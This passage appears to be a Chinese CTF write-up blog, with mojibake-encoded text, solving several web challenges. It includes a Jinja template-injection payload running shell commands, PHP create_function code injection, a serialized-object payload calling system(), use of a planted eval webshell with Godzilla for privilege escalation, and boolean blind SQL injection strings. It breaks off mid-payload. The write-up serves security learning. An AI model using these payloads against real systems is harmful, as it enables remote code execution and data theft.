</span></span><br></pre></td></tr></table></figure><p>ä¸€é“å¥‡å¥‡æ€ªæ€ªçš„é¢˜ï¼Œä¹‹å‰æ²¡æœ‰è§è¿‡ï¼Œé™¤äº†è¿™ä¸ªå°±å•¥éƒ½æ²¡æœ‰äº†ï¼Œç›®å½•ä¹Ÿä»€ä¹ˆéƒ½æ‰«ä¸åˆ°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TY&gt;curl -I -X OPTIONS <span class="string">&quot;node4.anna.nssctf.cn:28934/index.php&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 02 Dec 2024 11:09:33 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">DAV: 1,2</span><br><span class="line">DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><strong><code>-X OPTIONS</code></strong></p><p><code>-X OPTIONS</code> æŒ‡å®šäº†è¯·æ±‚çš„æ–¹æ³•ä¸º <code>OPTIONS</code>ï¼Œè¿™æ˜¯ HTTP çš„ä¸€ç§æ–¹æ³•ï¼Œå¸¸ç”¨äºæŸ¥è¯¢æœåŠ¡å™¨æ”¯æŒçš„ HTTP æ–¹æ³•ï¼ˆå¦‚ <code>GET</code>ã€<code>POST</code>ã€<code>PUT</code> ç­‰ï¼‰ã€‚</p><p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯å‘ <code>node4.anna.nssctf.cn:28934/index.php</code> å‘é€ä¸€ä¸ª <code>OPTIONS</code> è¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå“åº”å¤´ã€‚</p><p><strong>å†è¯´ä¸€ä¸‹PUTã€DELETEè¯·æ±‚ï¼ŒPUTã€DELETEè¯·æ±‚æœ¬èº«æœ€åˆæ˜¯ç”¨æ¥è¿›è¡Œæ–‡ä»¶ç®¡ç†çš„ï¼Œå½“ç„¶è¿™ä¸ªè¯·æ±‚å¦‚æœä¸ºè¿›è¡Œé‰´æƒå¤„ç†çš„è¯å°±ä¼šä»»æ„æ‰§è¡Œä¿®æ”¹å’Œåˆ é™¤ï¼ŒPUTè¯·æ±‚ï¼Œå¦‚æœä¸å­˜åœ¨è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå°†ä¼šåˆ›å»ºï¼Œå¦‚æœå­˜åœ¨ï¼Œä¼šæ‰§è¡Œè¦†ç›–æ“ä½œ</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png" alt="image-20241202191229996" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png" alt="image-20241202191236455" style="zoom: 80%;" /><p>æ‹¿æäº†</p><p>NSSCTF{031e835f-af6a-447d-838d-6d5e5b640e8e}</p><h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png" alt="image-20241202192140294" style="zoom:50%;" /><p>ä¸€é“jsé¢˜ç›®ï¼Œè¿™ç§é¢˜ä¸€èˆ¬ç›´æ¥ç»™äº†flagåœ¨æºç é‡Œï¼Œä½†æ˜¯æˆ‘æ‰¾ä¸åˆ°ã€‚è¿™é‡Œåˆšå¼€å§‹æ˜¯æ‰“ä¸å¼€æºç çš„</p><p>è¿™é‡Œå¯ä»¥å³é”®-&gt;æ£€æŸ¥</p><p>å…ˆå¤åˆ¶ç½‘é¡µurlï¼Œæ‰“å¼€f12ï¼Œå†è¾“å…¥ç½‘å€æ‰“å¼€ç½‘é¡µï¼Œè¿™æ ·f12å°±ä¼šä¿ç•™</p><p><a href="https://so.csdn.net/so/search?q=%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8&spm=1001.2101.3001.7020">ç«ç‹æµè§ˆå™¨</a>å³è¾¹çš„ä¸‰æ¨ª-&gt;æ›´å¤šå·¥å…·-&gt;å¼€å‘è€…å·¥å…·ã€‚</p><p>ä¸‰ç§æ–¹æ³•æ‰“å¼€f12</p><p>æ¥ä¸‹æ¥åˆ†æé¢˜ç›®</p><p>è¿™ç§jsçš„ç½‘é¡µï¼Œflagä¸€èˆ¬éƒ½æ˜¯alertç»™ä½ ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥æœä¸€ä¸‹alertå‡½æ•°</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png" alt="image-20241202192401696"></p><p>ä¸å‡ºæ„å¤–è¿™å°±æ˜¯flagäº†ã€‚å‰é¢æœ‰ä¸ªifæ¯”è¾ƒï¼Œè·Ÿè¿›ä¸€ä¸‹getScore</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png" alt="image-20241202192427751"></p><p>é‚£ä¹ˆåªè¦è®©è¿™ä¸ªreturnçš„scoreå€¼è¶…çº§å¤§å°±è¡Œï¼Œ84è¡Œæ‰“æ–­ç‚¹ç„¶åç©ºæ ¼è¿è¡Œæ¸¸æˆ</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png" alt="image-20241202192500153"></p><p>ç„¶åæ¥æ§åˆ¶å°æ”¹scoreçš„å€¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png" alt="image-20241202192515347"></p><p>å›è½¦é‡æ–°è¿è¡Œåalertå‡ºflag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png" alt="image-20241202192532428"></p><h2 id="NCTF-2018-Flask-PLUS"><a href="#NCTF-2018-Flask-PLUS" class="headerlink" title="[NCTF 2018]Flask PLUS"></a>[NCTF 2018]Flask PLUS</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png" alt="image-20241202195010229"></p><p>è¿™é¢˜æœ¬æ¥æƒ³ç€ç”¨fenjingï¼Œä½†æ˜¯è¿™ç§æ ¼å¼çš„å¥½åƒç”¨ä¸å¤ªäº†fenjing</p><p>Auraç»™å‡ºä¸€ä¸ªæ–¹æ³•ï¼š</p><blockquote><p>å¯ä»¥å…ˆæŠŠé»‘åå•fuzzå‡ºæ¥ï¼Œæœ¬åœ°å¼€ä¸€ä¸ªserverè·‘å‡ºæ¥payloadï¼Œå†æ‹¼ä¸Šå»</p></blockquote><p>è™½ç„¶ä½†æ˜¯è¿™é“é¢˜æ¯”è¾ƒç®€å•ç›´æ¥æ‰‹åŠ¨äº†ã€‚</p><p>è¿™é‡Œç»™å‡ºpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;tac /Th1s_is__F1114g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><p>ä¸€å…±æœ‰äº”ä¸ªlevelï¼Œç¬¬ä¸€å…³æ˜¯ç›®å½•æ‰«æï¼Œæ‰«å‡ºrobots.txtå³å¯ã€‚</p><p>ç¬¬äºŒå…³md5ç¢°æ’ï¼Œç®€å•</p><p>ç¬¬ä¸‰å…³sha1ç¢°æ’ï¼Œéƒ½æ˜¯æœ‰ç¬”è®°çš„ï¼Œç®€å•ã€‚</p><p>ç¬¬å››å…³çœ‹çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code> æ˜¯ä¸€ä¸ª PHP è¶…å…¨å±€å˜é‡ï¼Œè¡¨ç¤ºå½“å‰è¯·æ±‚çš„ URIï¼ˆUniform Resource Identifierï¼‰ã€‚å®ƒæä¾›äº†å®¢æˆ·ç«¯è¯·æ±‚çš„å®Œæ•´ URIï¼ŒåŒ…æ‹¬è·¯å¾„å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</p><blockquote><p><a href="http://example.com/test/page.php?name=John&age=30">http://example.com/test/page.php?name=John&amp;age=30</a></p><p>è¾“å‡º</p><p>&#x2F;test&#x2F;page.php?name&#x3D;John&amp;age&#x3D;30</p></blockquote><p>è€Œä¸‹åˆ’çº¿ç”¨åŠ å·ç»•è¿‡å³å¯ã€‚</p><p>æœ€åæ˜¯level5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±è¦ç”¨åˆ°create_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æ³¨é‡Šæ‰create_function()æ ¼å¼åé¢çš„â€™&#125;&#x27;,é˜²æ­¢æŠ¥é”™</span><br><span class="line"></span><br><span class="line">#create_function(â€˜$aâ€™, â€˜echo(â€œhelloâ€);â€™)çš„å®ç°é€»è¾‘å¦‚ä¸‹ï¼š</span><br><span class="line">function niming($a)</span><br><span class="line">&#123;</span><br><span class="line">echo(â€œhelloâ€);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">é¢˜ç›®é‡Œçš„payloadå°±æ˜¯ä¸‹é¢è¿™ä¸ª</span><br><span class="line">function niming()</span><br><span class="line">&#123;</span><br><span class="line">&#125;system(â€˜cat /flagâ€™);//&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤è¿™é‡Œçš„payloadä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;ls /&#x27;);//</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„åæ–œæ æ˜¯ç»•è¿‡preg_matchï¼ŒåŒæ—¶è½¬ä¹‰cï¼Œä¸ä¼šå¯¹å‡½æ•°é€ æˆå½±å“ã€‚</p><h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-Calculate"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-Calculate" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate</h2><p>ä¸€é“è®¡ç®—é¢˜ï¼Œç”¨pythonè§£é¢˜</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png" alt="image-20241203142059441"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:26952/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">res=sess.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    arg=re.findall(<span class="string">&#x27;&lt;div style=&quot;display:inline;color:#.&#123;6&#125;&quot;&gt;(.)&lt;/div&gt;&#x27;</span>,res.text)</span><br><span class="line">    question=<span class="string">&#x27;&#x27;</span>.join(arg)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    answer=<span class="built_in">eval</span>(question[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res=sess.post(url,data=&#123;<span class="string">&#x27;ans&#x27;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="FSCTF-2023-CanCanNeed"><a href="#FSCTF-2023-CanCanNeed" class="headerlink" title="[FSCTF 2023]CanCanNeed"></a>[FSCTF 2023]CanCanNeed</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;param1;</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable language_">$this</span>-&gt;param2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i&#x27;</span>, <span class="variable">$this</span>-&gt;param2)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;this param is error!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hi!Welcome to FSCTF2023!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä¸€çœ¼ä¸çœŸï¼Œcreate_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;system($_POST[jwk]);//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>æ‹¿æ</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•</p><p>ç›´æ¥requireä¹Ÿè¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;require(base64_decode(ZmlsZTovLy9mbGFn));//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="æ¹–æ¹˜æ¯-2021-final-Penetratable"><a href="#æ¹–æ¹˜æ¯-2021-final-Penetratable" class="headerlink" title="[æ¹–æ¹˜æ¯ 2021 final]Penetratable"></a>[æ¹–æ¹˜æ¯ 2021 final]Penetratable</h2><p>æœ‰æ³¨å†Œç™»å½•ç•Œé¢ï¼Œæœ‰rootç”¨æˆ·ï¼Œadminç”¨æˆ·</p><p>å°è¯•è¶Šæƒæ”¹rootå¯†ç ï¼Œæƒé™ä¸å¤Ÿï¼Œæ”¹adminå¯ä»¥ï¼ŒçŒœæµ‹rootåªæœ‰adminå¯ä»¥æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦è·å¾—adminæƒé™ã€‚è¿™é‡Œç›´æ¥ç”¨adminè´¦å·ç™»å½•æ˜¯æ”¹ä¸äº†çš„ï¼Œè¢«ç¦ç”¨äº†ã€‚</p><p>Informationç•Œé¢ä¼šå°†ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ï¼Œé‚£ä¹ˆå°è¯•äºŒæ¬¡æ³¨å…¥</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png" alt="image-20241203150323022"></p><p>è¿™é‡Œç›´æ¥ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹çš„å°±æ˜¯adminç”¨æˆ·çš„å¯†ç ï¼</p><p>ç„¶åå‘ç°æŒ‰é’®ä¸èƒ½æŒ‰ï¼Œf12çœ‹ä¸€ä¸‹å°±å¥½ï¼Œè‡ªå·±æ„é€ æ•°æ®åŒ…ï¼Œè¿™é‡Œç›´æ¥çœ‹jsæºç å°±è¡Œäº†ï¼Œé‡Œé¢éƒ½æœ‰</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png" alt="image-20241203151646902"></p><p>rootå¯†ç æˆåŠŸä¿®æ”¹æˆ123456ï¼Œç™»é™†ä¸€ä¸‹çœ‹çœ‹ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png" alt="image-20241203151737374"></p><p>æˆåŠŸç™»å½•ï¼Œå¤šäº†ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½ç‚¹</p><p>æŠ“ä¸€ä¸‹åŒ…çœ‹çœ‹</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png" alt="image-20241203151855387" style="zoom:67%;" /><p>çœ‹çœ‹èƒ½ä¸èƒ½ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png" alt="image-20241203152039720" style="zoom: 67%;" /><p>ç›®å½•ç©¿è¶Šæ¼æ´~</p><p>ä¹‹å‰æ‰«æºç æ‰«åˆ°è¿‡phpinfo.phpï¼Œé‚£å°±è¯»å–ä¸€ä¸‹è¯•è¯•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;pass_31d5df001717&#x27;</span>])===<span class="string">&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]);&#125; </span><br><span class="line"><span class="comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png" alt="image-20241203152536667"></p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥æ˜¯å¯ä»¥ç›´æ¥æ‹¿åˆ°&#x2F;flagçš„å†…å®¹çš„ï¼Œä½†æ˜¯è¿™é‡Œï¼ï¼ä»–å±…ç„¶ä¸è®©æˆ‘è¯»ï¼æƒé™å¤ªä½äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ææƒï¼</p><p>å…ˆä¸Šçº¿å“¥æ–¯æ‹‰ï¼</p><p>è¿™é‡Œæ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œä»–çš„å¯†ç ccæ˜¯GETç±»å‹ä¼ å‚çš„ï¼Œè¿™ä¸èƒ½è¢«webshellç®¡ç†å·¥å…·åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬cc&#x3D;eval($_POST[1]);ç„¶åæŠŠ1å½“ä½œå¯†ç å³å¯ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png" alt="image-20241203153252371"></p><p>å®é”¤äº†ï¼</p><p>ææƒå§æ¥ä¸‹æ¥<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png" alt="image-20241203154849744"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png" alt="image-20241203155021110"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png" alt="image-20241203155429796"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png" alt="image-20241203155415823"></p><p>æ‹¿æï¼</p><h2 id="CISCN-2022-åˆèµ›-ezpop"><a href="#CISCN-2022-åˆèµ›-ezpop" class="headerlink" title="[CISCN 2022 åˆèµ›]ezpop"></a>[CISCN 2022 åˆèµ›]ezpop</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png" alt="image-20241203163625594"></p><p>ç”¨phpggcè¯•äº†åŠå¤©ç»“æœä¸è¡Œï¼Œä¸çŸ¥é“ä¸ºå•¥</p><p>åªèƒ½è‡ªå·±è·Ÿäº†ï¼Œè·Ÿæ‰“0dayä¸€æ ·ã€‚ã€‚ã€‚ã€‚ä¸è¿‡æŒºå¥½çš„</p><p>è¯¦æƒ…çœ‹ç¬”è®°ï¼ï¼ï¼è¯´ç™½äº†ç›´æ¥ç”¨expå°±è¡Œ</p><h2 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h2><p>ä¸€é“å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œç»™å‡ºpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_table=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span 